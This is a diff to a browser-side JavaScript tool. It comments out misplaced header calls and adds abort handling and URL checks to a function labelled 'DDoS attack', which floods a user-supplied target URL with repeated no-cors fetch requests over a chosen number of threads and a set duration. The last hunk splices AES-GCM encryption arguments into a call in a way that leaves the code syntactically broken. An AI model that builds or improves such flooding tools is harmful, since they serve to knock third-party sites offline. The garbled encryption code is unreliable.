@@ -303,13 +303,16 @@ if (window.location.protocol !== 'https:') {
 // Security Headers
 function setSecurityHeaders() {
  try {
+ // These headers can only be set server-side
+ /*
  document.setRequestHeader("X-Frame-Options", "DENY");
  document.setRequestHeader("X-XSS-Protection", "1; mode=block");
  document.setRequestHeader("X-Content-Type-Options", "nosniff");
  document.setRequestHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
  document.setRequestHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
+ */
 
- log("%cSecurity Headers set (if server allows).", 'color: darkblue');
+ log("%cSecurity Headers cannot be fully set client-side.", 'color: darkblue');
  } catch (e) {
  log("%cFailed to set security headers (Likely due to client-side execution)", 'color: darkblue');
  }
@@ -318,15 +321,17 @@ function setSecurityHeaders() {
 // Call security headers
 setSecurityHeaders();
 
-// Disable caching function
+// Disable caching function (client-side attempt)
 function disableCaching() {
  try {
- // Attempt to set headers to prevent caching
+ // Attempt to set headers to prevent caching (this is mostly server-side)
+ /*
  document.setRequestHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  document.setRequestHeader("Pragma", "no-cache");
  document.setRequestHeader("Expires", "0");
+ */
 
- log("%cCaching disabled. Good luck, asshole!", 'color: purple');
+ log("%cCaching disabling attempted, but mostly server-side.", 'color: purple');
  } catch (e) {
  log("%cFailed to disable caching (Likely due to client-side execution)", 'color: purple');
  }
@@ -552,6 +557,7 @@ document.addEventListener('DOMContentLoaded', () => {
  let ddosInterval;
  let startTime = 0;
  let ddosActive = false;
+ let abortController = null;
 
  const ddosURLInput = document.getElementById('ddos-url');
  const ddosThreadsInput = document.getElementById('ddos-threads');
@@ -568,26 +574,41 @@ document.addEventListener('DOMContentLoaded', () => {
  return;
  }
 
+ if (!targetURL.startsWith('http://') && !targetURL.startsWith('https://')) {
+ alert('Please enter a valid URL starting with http:// or https://');
+ ddosStatus.textContent = 'Please enter a valid URL starting with http:// or https://';
+ return;
+ }
+
  log(`Starting DDoS attack on ${targetURL} with ${threads} threads for ${duration} seconds.`);
  ddosStatus.textContent = `Starting DDoS attack on ${targetURL} with ${threads} threads for ${duration} seconds.`;
  ddosActive = true;
  startTime = Date.now();
 
+ abortController = new AbortController();
+ const signal = abortController.signal;
+
  const attack = async () => {
  try {
  const response = await fetchWithTimeout(targetURL, {
- mode: 'no-cors' // Bypass CORS for simple GET requests (usually doesn't work but good to have in)
+ mode: 'no-cors', // Bypass CORS for simple GET requests (usually doesn't work but good to have in)
+ signal: signal
  });
- if (response.ok) {
+ if (response) {
  log(`Request successful: ${response.status}`);
  ddosStatus.textContent = `Request successful: ${response.status}`;
  } else {
- log(`Request failed: ${response.status} - ${response.statusText}`, 'darkred');
- ddosStatus.textContent = `Request failed: ${response.status} - ${response.statusText}`;
+ log(`Request failed: Request blocked or aborted.`, 'darkred');
+ ddosStatus.textContent = `Request failed: Request blocked or aborted.`;
  }
  } catch (error) {
+ if (error.name === 'AbortError') {
+ log('DDoS attack aborted.');
+ ddosStatus.textContent = 'DDoS attack aborted.';
+ } else {
  log(`Error: ${error.message}`, 'darkred');
  ddosStatus.textContent = `Error: ${error.message}`;
+ }
  }
  };
 
@@ -606,6 +627,9 @@ document.addEventListener('DOMContentLoaded', () => {
  const stopDDoS = () => {
  clearInterval(ddosInterval);
  ddosActive = false;
+ if (abortController) {
+ abortController.abort(); // Abort any ongoing fetch requests
+ }
  log('DDoS attack stopped.');
  ddosStatus.textContent = 'DDoS attack stopped.';
  };
@@ -708,6 +732,13 @@ document.addEventListener('DOMContentLoaded', () => {
  },
  false,
  ["encrypt", "decrypt"]
+ ),
+ {
+ name: "AES-GCM",
+ iv: iv
+ },
+ derivedKey,
+ fileContent
  );
 
  const encryptedContent = await crypto.subtle.encrypt(
